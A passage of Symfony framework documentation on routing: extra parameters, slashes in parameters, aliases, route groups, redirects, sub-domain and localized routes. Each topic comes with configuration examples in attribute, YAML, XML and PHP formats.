)]\n            public function search(): Response\n            {\n            }\n        }\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        article_search:\n          path:        /articles/{_locale}/search.{_format}\n          controller:  App\\Controller\\ArticleController::search\n          locale:      en\n          format:      html\n          requirements:\n              _locale: en|fr\n              _format: html|xml\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"article_search\"\n                path=\"/articles/{_locale}/search.{_format}\"\n                controller=\"App\\Controller\\ArticleController::search\"\n                locale=\"en\"\n                format=\"html\">\n\n                <requirement key=\"_locale\">en|fr</requirement>\n                <requirement key=\"_format\">html|xml</requirement>\n\n            </route>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        namespace Symfony\\Component\\Routing\\Loader\\Configurator;\n\n        use App\\Controller\\ArticleController;\n\n        return static function (RoutingConfigurator $routes): void {\n            $routes->add('article_show', '/articles/{_locale}/search.{_format}')\n                ->controller([ArticleController::class, 'search'])\n                ->locale('en')\n                ->format('html')\n                ->requirements([\n                    '_locale' => 'en|fr',\n                    '_format' => 'html|xml',\n                ])\n            ;\n        };\n\nExtra Parameters\n~~~~~~~~~~~~~~~~\n\nIn the ``defaults`` option of a route you can optionally define parameters not\nincluded in the route configuration. This is useful to pass extra arguments to\nthe controllers of the routes:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/BlogController.php\n        namespace App\\Controller;\n\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n        use Symfony\\Component\\HttpFoundation\\Response;\n        use Symfony\\Component\\Routing\\Attribute\\Route;\n\n        class BlogController extends AbstractController\n        {\n            #[Route('/blog/{page}', name: 'blog_index', defaults: ['page' => 1, 'title' => 'Hello world!'])]\n            public function index(int $page, string $title): Response\n            {\n                // ...\n            }\n        }\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        blog_index:\n            path:       /blog/{page}\n            controller: App\\Controller\\BlogController::index\n            defaults:\n                page: 1\n                title: \"Hello world!\"\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"blog_index\" path=\"/blog/{page}\" controller=\"App\\Controller\\BlogController::index\">\n                <default key=\"page\">1</default>\n                <default key=\"title\">Hello world!</default>\n            </route>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use App\\Controller\\BlogController;\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return static function (RoutingConfigurator $routes): void {\n            $routes->add('blog_index', '/blog/{page}')\n                ->controller([BlogController::class, 'index'])\n                ->defaults([\n                    'page'  => 1,\n                    'title' => 'Hello world!',\n                ])\n            ;\n        };\n\n.. _routing-slash-in-parameters:\n\nSlash Characters in Route Parameters\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nRoute parameters can contain any values except the ``/`` slash character,\nbecause that's the character used to separate the different parts of the URLs.\nFor example, if the ``token`` value in the ``/share/{token}`` route contains a\n``/`` character, this route won't match.\n\nA possible solution is to change the parameter requirements to be more permissive:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/DefaultController.php\n        namespace App\\Controller;\n\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n        use Symfony\\Component\\HttpFoundation\\Response;\n        use Symfony\\Component\\Routing\\Attribute\\Route;\n\n        class DefaultController extends AbstractController\n        {\n            #[Route('/share/{token}', name: 'share', requirements: ['token' => '.+'])]\n            public function share($token): Response\n            {\n                // ...\n            }\n        }\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        share:\n            path:       /share/{token}\n            controller: App\\Controller\\DefaultController::share\n            requirements:\n                token: .+\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"share\" path=\"/share/{token}\" controller=\"App\\Controller\\DefaultController::share\">\n                <requirement key=\"token\">.+</requirement>\n            </route>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use App\\Controller\\DefaultController;\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return static function (RoutingConfigurator $routes): void {\n            $routes->add('share', '/share/{token}')\n                ->controller([DefaultController::class, 'share'])\n                ->requirements([\n                    'token' => '.+',\n                ])\n            ;\n        };\n\n.. note::\n\n    If the route defines several parameters and you apply this permissive\n    regular expression to all of them, you might get unexpected results. For\n    example, if the route definition is ``/share/{path}/{token}`` and both\n    ``path`` and ``token`` accept ``/``, then ``token`` will only get the last part\n    and the rest is matched by ``path``.\n\n.. note::\n\n    If the route includes the special ``{_format}`` parameter, you shouldn't\n    use the ``.+`` requirement for the parameters that allow slashes. For example,\n    if the pattern is ``/share/{token}.{_format}`` and ``{token}`` allows any\n    character, the ``/share/foo/bar.json`` URL will consider ``foo/bar.json``\n    as the token and the format will be empty. This can be solved by replacing\n    the ``.+`` requirement by ``[^.]+`` to allow any character except dots.\n\n.. _routing-alias:\n\nRoute Aliasing\n--------------\n\nRoute alias allow you to have multiple name for the same route:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        new_route_name:\n            alias: original_route_name\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"new_route_name\" alias=\"original_route_name\"/>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return static function (RoutingConfigurator $routes): void {\n            $routes->alias('new_route_name', 'original_route_name');\n        };\n\nIn this example, both ``original_route_name`` and ``new_route_name`` routes can\nbe used in the application and will produce the same result.\n\n.. _routing-alias-deprecation:\n\nDeprecating Route Aliases\n~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf some route alias should no longer be used (because it is outdated or\nyou decided not to maintain it anymore), you can deprecate its definition:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        new_route_name:\n            alias: original_route_name\n\n            # this outputs the following generic deprecation message:\n            # Since acme/package 1.2: The \"new_route_name\" route alias is deprecated. You should stop using it, as it will be removed in the future.\n            deprecated:\n                package: 'acme/package'\n                version: '1.2'\n\n            # you can also define a custom deprecation message (%alias_id% placeholder is available)\n            deprecated:\n                package: 'acme/package'\n                version: '1.2'\n                message: 'The \"%alias_id%\" route alias is deprecated. Do not use it anymore.'\n\n    .. code-block:: xml\n\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"new_route_name\" alias=\"original_route_name\">\n                <!-- this outputs the following generic deprecation message:\n                     Since acme/package 1.2: The \"new_route_name\" route alias is deprecated. You should stop using it, as it will be removed in the future. -->\n                <deprecated package=\"acme/package\" version=\"1.2\"/>\n\n                <!-- you can also define a custom deprecation message (%alias_id% placeholder is available) -->\n                <deprecated package=\"acme/package\" version=\"1.2\">\n                    The \"%alias_id%\" route alias is deprecated. Do not use it anymore.\n                </deprecated>\n            </route>\n        </routes>\n\n    .. code-block:: php\n\n        $routes->alias('new_route_name', 'original_route_name')\n            // this outputs the following generic deprecation message:\n            // Since acme/package 1.2: The \"new_route_name\" route alias is deprecated. You should stop using it, as it will be removed in the future.\n            ->deprecate('acme/package', '1.2', '')\n\n            // you can also define a custom deprecation message (%alias_id% placeholder is available)\n            ->deprecate(\n                'acme/package',\n                '1.2',\n                'The \"%alias_id%\" route alias is deprecated. Do not use it anymore.'\n            )\n        ;\n\nIn this example, every time the ``new_route_name`` alias is used, a deprecation\nwarning is triggered, advising you to stop using that alias.\n\nThe message is actually a message template, which replaces occurrences of the\n``%alias_id%`` placeholder by the route alias name. You **must** have\nat least one occurrence of the ``%alias_id%`` placeholder in your template.\n\n.. _routing-route-groups:\n\nRoute Groups and Prefixes\n-------------------------\n\nIt's common for a group of routes to share some options (e.g. all routes related\nto the blog start with ``/blog``) That's why Symfony includes a feature to share\nroute configuration.\n\nWhen defining routes as attributes, put the common configuration\nin the ``#[Route]`` attribute of the controller class.\nIn other routing formats, define the common configuration using options\nwhen importing the routes.\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/BlogController.php\n        namespace App\\Controller;\n\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n        use Symfony\\Component\\HttpFoundation\\Response;\n        use Symfony\\Component\\Routing\\Attribute\\Route;\n\n        #[Route('/blog', requirements: ['_locale' => 'en|es|fr'], name: 'blog_')]\n        class BlogController extends AbstractController\n        {\n            #[Route('/{_locale}', name: 'index')]\n            public function index(): Response\n            {\n                // ...\n            }\n\n            #[Route('/{_locale}/posts/{slug}', name: 'show')]\n            public function show(string $slug): Response\n            {\n                // ...\n            }\n        }\n\n    .. code-block:: yaml\n\n        # config/routes/attributes.yaml\n        controllers:\n            resource: '../../src/Controller/'\n            type: attribute\n            # this is added to the beginning of all imported route URLs\n            prefix: '/blog'\n            # this is added to the beginning of all imported route names\n            name_prefix: 'blog_'\n            # these requirements are added to all imported routes\n            requirements:\n                _locale: 'en|es|fr'\n\n            # An imported route with an empty URL will become \"/blog/\"\n            # Uncomment this option to make that URL \"/blog\" instead\n            # trailing_slash_on_root: false\n\n            # you can optionally exclude some files/subdirectories when loading attributes\n            # (the value must be a string or an array of PHP glob patterns)\n            # exclude: '../../src/Controller/{Debug*Controller.php}'\n\n    .. code-block:: xml\n\n        <!-- config/routes/attributes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <!--\n                the 'prefix' value is added to the beginning of all imported route URLs\n                the 'name-prefix' value is added to the beginning of all imported route names\n                the 'exclude' option defines the files or subdirectories ignored when loading attributes\n                (the value must be a PHP glob pattern and you can repeat this option any number of times)\n            -->\n            <import resource=\"../../src/Controller/\"\n                type=\"attribute\"\n                prefix=\"/blog\"\n                name-prefix=\"blog_\"\n                exclude=\"../../src/Controller/{Debug*Controller.php}\">\n                <!-- these requirements are added to all imported routes -->\n                <requirement key=\"_locale\">en|es|fr</requirement>\n            </import>\n\n            <!-- An imported route with an empty URL will become \"/blog/\"\n                 Uncomment this option to make that URL \"/blog\" instead -->\n            <import resource=\"../../src/Controller/\" type=\"attribute\"\n                    prefix=\"/blog\"\n                    trailing-slash-on-root=\"false\">\n                    <!-- ... -->\n            </import>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes/attributes.php\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return static function (RoutingConfigurator $routes): void {\n            $routes->import(\n                    '../../src/Controller/',\n                    'attribute',\n                    false,\n                    // the optional fourth argument is used to exclude some files\n                    // or subdirectories when loading attributes\n                    // (the value must be a string or an array of PHP glob patterns)\n                    '../../src/Controller/{Debug*Controller.php}'\n                )\n                // this is added to the beginning of all imported route URLs\n                ->prefix('/blog')\n\n                // An imported route with an empty URL will become \"/blog/\"\n                // Pass FALSE as the second argument to make that URL \"/blog\" instead\n                // ->prefix('/blog', false)\n\n                // this is added to the beginning of all imported route names\n                ->namePrefix('blog_')\n\n                // these requirements are added to all imported routes\n                ->requirements(['_locale' => 'en|es|fr'])\n            ;\n        };\n\n.. warning::\n\n    The ``exclude`` option only works when the ``resource`` value is a glob string.\n    If you use a regular string (e.g. ``'../src/Controller'``) the ``exclude``\n    value will be ignored.\n\nIn this example, the route of the ``index()`` action will be called ``blog_index``\nand its URL will be ``/blog/{_locale}``. The route of the ``show()`` action will be called\n``blog_show`` and its URL will be ``/blog/{_locale}/posts/{slug}``. Both routes\nwill also validate that the ``_locale`` parameter matches the regular expression\ndefined in the class attribute.\n\n.. note::\n\n    If any of the prefixed routes defines an empty path, Symfony adds a trailing\n    slash to it. In the previous example, an empty path prefixed with ``/blog``\n    will result in the ``/blog/`` URL. If you want to avoid this behavior, set\n    the ``trailing_slash_on_root`` option to ``false`` (this option is not\n    available when using PHP attributes):\n\n    .. configuration-block::\n\n        .. code-block:: yaml\n\n            # config/routes/attributes.yaml\n            controllers:\n                resource: '../../src/Controller/'\n                type:     attribute\n                prefix:   '/blog'\n                trailing_slash_on_root: false\n                # ...\n\n        .. code-block:: xml\n\n            <!-- config/routes/attributes.xml -->\n            <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n            <routes xmlns=\"http://symfony.com/schema/routing\"\n                xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n                xsi:schemaLocation=\"http://symfony.com/schema/routing\n                    https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n                <import resource=\"../../src/Controller/\"\n                    type=\"attribute\"\n                    prefix=\"/blog\"\n                    name-prefix=\"blog_\"\n                    trailing-slash-on-root=\"false\"\n                    exclude=\"../../src/Controller/{DebugEmailController}.php\">\n                    <!-- ... -->\n                </import>\n            </routes>\n\n        .. code-block:: php\n\n            // config/routes/attributes.php\n            use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n            return static function (RoutingConfigurator $routes): void {\n                $routes->import('../../src/Controller/', 'attribute')\n                    // the second argument is the $trailingSlashOnRoot option\n                    ->prefix('/blog', false)\n\n                    // ...\n                ;\n            };\n\n.. seealso::\n\n    Symfony can :doc:`import routes from different sources </routing/custom_route_loader>`\n    and you can even create your own route loader.\n\nGetting the Route Name and Parameters\n-------------------------------------\n\nThe ``Request`` object created by Symfony stores all the route configuration\n(such as the name and parameters) in the \"request attributes\". You can get this\ninformation in a controller via the ``Request`` object::\n\n    // src/Controller/BlogController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Request;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n\n    class BlogController extends AbstractController\n    {\n        #[Route('/blog', name: 'blog_list')]\n        public function list(Request $request): Response\n        {\n            $routeName = $request->attributes->get('_route');\n            $routeParameters = $request->attributes->get('_route_params');\n\n            // use this to get all the available attributes (not only routing ones):\n            $allAttributes = $request->attributes->all();\n\n            // ...\n        }\n    }\n\nIn services, you can get this information by\n:doc:`injecting the RequestStack service </service_container/request>`.\nIn templates, use the :ref:`Twig global app variable <twig-app-variable>`\nto get the current route name (``app.current_route``) and its parameters\n(``app.current_route_parameters``).\n\nSpecial Routes\n--------------\n\nSymfony defines some special controllers to render templates and redirect to\nother routes from the route configuration so you don't have to create a\ncontroller action.\n\nRendering a Template Directly from a Route\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nRead the section about :ref:`rendering a template from a route <templates-render-from-route>`\nin the main article about Symfony templates.\n\nRedirecting to URLs and Routes Directly from a Route\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nUse the ``RedirectController`` to redirect to other routes and URLs:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        doc_shortcut:\n            path: /doc\n            controller: Symfony\\Bundle\\FrameworkBundle\\Controller\\RedirectController\n            defaults:\n                route: 'doc_page'\n                # optionally you can define some arguments passed to the route\n                page: 'index'\n                version: 'current'\n                # redirections are temporary by default (code 302) but you can make them permanent (code 301)\n                permanent: true\n                # add this to keep the original query string parameters when redirecting\n                keepQueryParams: true\n                # add this to keep the HTTP method when redirecting. The redirect status changes\n                # * for temporary redirects, it uses the 307 status code instead of 302\n                # * for permanent redirects, it uses the 308 status code instead of 301\n                keepRequestMethod: true\n                # add this to remove all original route attributes when redirecting\n                ignoreAttributes: true\n                # or specify which attributes to ignore:\n                # ignoreAttributes: ['offset', 'limit']\n\n        legacy_doc:\n            path: /legacy/doc\n            controller: Symfony\\Bundle\\FrameworkBundle\\Controller\\RedirectController\n            defaults:\n                # this value can be an absolute path or an absolute URL\n                path: 'https://legacy.example.com/doc'\n                permanent: true\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"doc_shortcut\" path=\"/doc\"\n                   controller=\"Symfony\\Bundle\\FrameworkBundle\\Controller\\RedirectController\">\n                <default key=\"route\">doc_page</default>\n                <!-- optionally you can define some arguments passed to the route -->\n                <default key=\"page\">index</default>\n                <default key=\"version\">current</default>\n                <!-- redirections are temporary by default (code 302) but you can make them permanent (code 301)-->\n                <default key=\"permanent\">true</default>\n                <!-- add this to keep the original query string parameters when redirecting -->\n                <default key=\"keepQueryParams\">true</default>\n                <!-- add this to keep the HTTP method when redirecting. The redirect status changes:\n                     * for temporary redirects, it uses the 307 status code instead of 302\n                     * for permanent redirects, it uses the 308 status code instead of 301 -->\n                <default key=\"keepRequestMethod\">true</default>\n            </route>\n\n            <route id=\"legacy_doc\" path=\"/legacy/doc\"\n                   controller=\"Symfony\\Bundle\\FrameworkBundle\\Controller\\RedirectController\">\n                <!-- this value can be an absolute path or an absolute URL -->\n                <default key=\"path\">https://legacy.example.com/doc</default>\n                <!-- redirections are temporary by default (code 302) but you can make them permanent (code 301)-->\n                <default key=\"permanent\">true</default>\n            </route>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use App\\Controller\\DefaultController;\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\RedirectController;\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return static function (RoutingConfigurator $routes): void {\n            $routes->add('doc_shortcut', '/doc')\n                ->controller(RedirectController::class)\n                 ->defaults([\n                    'route' => 'doc_page',\n                    // optionally you can define some arguments passed to the route\n                    'page' => 'index',\n                    'version' => 'current',\n                    // redirections are temporary by default (code 302) but you can make them permanent (code 301)\n                    'permanent' => true,\n                    // add this to keep the original query string parameters when redirecting\n                    'keepQueryParams' => true,\n                    // add this to keep the HTTP method when redirecting. The redirect status changes:\n                    // * for temporary redirects, it uses the 307 status code instead of 302\n                    // * for permanent redirects, it uses the 308 status code instead of 301\n                    'keepRequestMethod' => true,\n                ])\n            ;\n\n            $routes->add('legacy_doc', '/legacy/doc')\n                ->controller(RedirectController::class)\n                 ->defaults([\n                    // this value can be an absolute path or an absolute URL\n                    'path' => 'https://legacy.example.com/doc',\n                    // redirections are temporary by default (code 302) but you can make them permanent (code 301)\n                    'permanent' => true,\n                ])\n            ;\n        };\n\n.. tip::\n\n    Symfony also provides some utilities to\n    :ref:`redirect inside controllers <controller-redirect>`\n\n.. _routing-trailing-slash-redirection:\n\nRedirecting URLs with Trailing Slashes\n......................................\n\nHistorically, URLs have followed the UNIX convention of adding trailing slashes\nfor directories (e.g. ``https://example.com/foo/``) and removing them to refer\nto files (``https://example.com/foo``). Although serving different contents for\nboth URLs is OK, nowadays it's common to treat both URLs as the same URL and\nredirect between them.\n\nSymfony follows this logic to redirect between URLs with and without trailing\nslashes (but only for ``GET`` and ``HEAD`` requests):\n\n==========  ========================================  ==========================================\nRoute URL   If the requested URL is ``/foo``          If the requested URL is ``/foo/``\n==========  ========================================  ==========================================\n``/foo``    It matches (``200`` status response)      It makes a ``301`` redirect to ``/foo``\n``/foo/``   It makes a ``301`` redirect to ``/foo/``  It matches (``200`` status response)\n==========  ========================================  ==========================================\n\nSub-Domain Routing\n------------------\n\nRoutes can configure a ``host`` option to require that the HTTP host of the\nincoming requests matches some specific value. In the following example, both\nroutes match the same path (``/``) but one of them only responds to a specific\nhost name:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/MainController.php\n        namespace App\\Controller;\n\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n        use Symfony\\Component\\HttpFoundation\\Response;\n        use Symfony\\Component\\Routing\\Attribute\\Route;\n\n        class MainController extends AbstractController\n        {\n            #[Route('/', name: 'mobile_homepage', host: 'm.example.com')]\n            public function mobileHomepage(): Response\n            {\n                // ...\n            }\n\n            #[Route('/', name: 'homepage')]\n            public function homepage(): Response\n            {\n                // ...\n            }\n        }\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        mobile_homepage:\n            path:       /\n            host:       m.example.com\n            controller: App\\Controller\\MainController::mobileHomepage\n\n        homepage:\n            path:       /\n            controller: App\\Controller\\MainController::homepage\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"mobile_homepage\"\n                path=\"/\"\n                host=\"m.example.com\"\n                controller=\"App\\Controller\\MainController::mobileHomepage\"/>\n\n            <route id=\"homepage\" path=\"/\" controller=\"App\\Controller\\MainController::homepage\"/>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use App\\Controller\\MainController;\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return static function (RoutingConfigurator $routes): void {\n            $routes->add('mobile_homepage', '/')\n                ->controller([MainController::class, 'mobileHomepage'])\n                ->host('m.example.com')\n            ;\n            $routes->add('homepage', '/')\n                ->controller([MainController::class, 'homepage'])\n            ;\n        };\n\nThe value of the ``host`` option can include parameters (which is useful in\nmulti-tenant applications) and these parameters can be validated too with\n``requirements``:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/MainController.php\n        namespace App\\Controller;\n\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n        use Symfony\\Component\\HttpFoundation\\Response;\n        use Symfony\\Component\\Routing\\Attribute\\Route;\n\n        class MainController extends AbstractController\n        {\n            #[Route(\n                '/',\n                name: 'mobile_homepage',\n                host: '{subdomain}.example.com',\n                defaults: ['subdomain' => 'm'],\n                requirements: ['subdomain' => 'm|mobile'],\n            )]\n            public function mobileHomepage(): Response\n            {\n                // ...\n            }\n\n            #[Route('/', name: 'homepage')]\n            public function homepage(): Response\n            {\n                // ...\n            }\n        }\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        mobile_homepage:\n            path:       /\n            host:       \"{subdomain}.example.com\"\n            controller: App\\Controller\\MainController::mobileHomepage\n            defaults:\n                subdomain: m\n            requirements:\n                subdomain: m|mobile\n\n        homepage:\n            path:       /\n            controller: App\\Controller\\MainController::homepage\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"mobile_homepage\"\n                path=\"/\"\n                host=\"{subdomain}.example.com\"\n                controller=\"App\\Controller\\MainController::mobileHomepage\">\n                <default key=\"subdomain\">m</default>\n                <requirement key=\"subdomain\">m|mobile</requirement>\n            </route>\n\n            <route id=\"homepage\" path=\"/\" controller=\"App\\Controller\\MainController::homepage\"/>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use App\\Controller\\MainController;\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return static function (RoutingConfigurator $routes): void {\n            $routes->add('mobile_homepage', '/')\n                ->controller([MainController::class, 'mobileHomepage'])\n                ->host('{subdomain}.example.com')\n                ->defaults([\n                    'subdomain' => 'm',\n                ])\n                ->requirements([\n                    'subdomain' => 'm|mobile',\n                ])\n            ;\n            $routes->add('homepage', '/')\n                ->controller([MainController::class, 'homepage'])\n            ;\n        };\n\nIn the above example, the ``subdomain`` parameter defines a default value because\notherwise you need to include a subdomain value each time you generate a URL using\nthese routes.\n\n.. tip::\n\n    You can also set the ``host`` option when :ref:`importing routes <routing-route-groups>`\n    to make all of them require that host name.\n\n.. note::\n\n    When using sub-domain routing, you must set the ``Host`` HTTP headers in\n    :doc:`functional tests </testing>` or routes won't match::\n\n        $crawler = $client->request(\n            'GET',\n            '/',\n            [],\n            [],\n            ['HTTP_HOST' => 'm.example.com']\n            // or get the value from some configuration parameter:\n            // ['HTTP_HOST' => 'm.'.$client->getContainer()->getParameter('domain')]\n        );\n\n.. tip::\n\n    You can also use the inline defaults and requirements format in the\n    ``host`` option: ``{subdomain<m|mobile>?m}.example.com``\n\n.. _i18n-routing:\n\nLocalized Routes (i18n)\n-----------------------\n\nIf your application is translated into multiple languages, each route can define\na different URL per each :ref:`translation locale <translation-locale>`. This\navoids the need for duplicating routes, which also reduces the potential bugs:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/CompanyController.php\n        namespace App\\Controller;\n\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n        use Symfony\\Component\\HttpFoundation\\Response;\n        use Symfony\\Component\\Routing\\Attribute\\Route;\n\n        class CompanyController extends AbstractController\n        {\n            #[Route(path: [\n                'en' => '/about-us',\n                'nl' => '/over-ons'\n            ], name: 'about_us')]\n            public function about(): Response\n            {\n                // ...\n            }\n        }\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        about_us:\n            path:\n                en: /about-us\n                nl: /over-ons\n            controller: App\\Controller\\CompanyController::about\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"about_us\" controller=\"App\\Controller\\CompanyController::about\">\n                <path locale=\"en\">/about-us</path>\n                <path locale=\"nl\">/over-ons</path>\n            </route>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use App\\Controller\\CompanyController;\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return static function (RoutingConfigurator $routes): void {\n            $routes->add('about_us', [\n                'en' => '/about-us',\n                'nl' => '/over-ons',\n            ])\n                ->controller([CompanyController::class, 'about'])\n            ;\n        };\n\n.. note::\n\n    When using PHP attributes for localized routes, you have to use the ``path``\n    named parameter to specify the array of paths.\n\nWhen a localized route is matched, Symfony uses the same locale automatically\nduring the entire request.\n\n.. tip::\n\n    When the application uses full \"language + territory\" locales (e.g. ``fr_FR``,\n    ``fr_BE``), if the URLs are the same in all related locales, routes can use\n    only the language part (e.g. ``fr``) to avoid repeating the same URLs.\n\nA common requirement for internationalized applications is to prefix all routes\nwith a locale. This can be done by defining a different prefix for each locale\n(and setting an empty prefix for your default locale if you prefer it):\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/routes/attributes.yaml\n        controllers:\n            resource: '../../src/Controller/'\n            type: attribute\n            prefix:\n                en: '' # don't prefix URLs for English, the default locale\n                nl: '/nl'\n\n    .. code-block:: xml\n\n        <!-- config/routes/attributes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <import resource=\"../../src/Controller/\" type=\"attribute\">\n                <!-- don't prefix URLs for English, the default locale -->\n                <prefix locale=\"en\"></prefix>\n                <prefix locale=\"nl\">/nl</prefix>\n            </import>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes/attributes.php\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return static function (RoutingConfigurator $routes): void {\n            $routes->import('../../src/Controller/', 'attribute')\n                ->prefix([\n                    // don't prefix URLs for English, the default locale\n                    'en' => '',\n                    'nl' => '/nl',\n                ])\n            ;\n        };\n\n.. 